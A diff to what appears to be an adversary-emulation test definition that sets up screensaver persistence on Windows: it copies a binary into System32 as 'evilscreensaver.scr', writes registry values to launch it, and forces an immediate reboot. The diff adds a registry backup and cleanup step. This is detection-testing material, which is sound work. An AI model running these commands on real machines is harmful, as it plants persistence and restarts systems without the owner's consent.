@@ -14,11 +14,16 @@ atomic_tests:
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
+      reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
       copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
       reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
       reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
       reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
       reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
       shutdown /r /t 0
+    cleanup_command: |
+      reg import %userprofile%\backup.reg
+      del %userprofile%\backup.reg
+      del %SystemRoot%\System32\evilscreensaver.scr
     name: command_prompt
     elevation_required: true
